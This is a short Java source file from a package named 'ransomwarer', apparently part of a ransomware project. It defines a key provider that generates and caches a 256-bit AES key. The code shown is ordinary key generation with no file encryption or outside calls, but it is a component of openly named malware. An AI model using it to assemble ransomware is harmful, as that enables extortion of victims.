package com.ransom.ransomwarer;

import java.security.NoSuchAlgorithmException;

import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;

public class CacheGeneratorKeyProvider implements KeyProvider {
	private SecretKey key;
	public CacheGeneratorKeyProvider(){
		key = null;
	}
	public SecretKey getKey() {
		if(key != null) return key;
		KeyGenerator generator;
		try {
			generator = KeyGenerator.getInstance("AES");
			generator.init(256);
		} catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
			return null;
		}
		key = generator.generateKey();
		return key;
	}

}
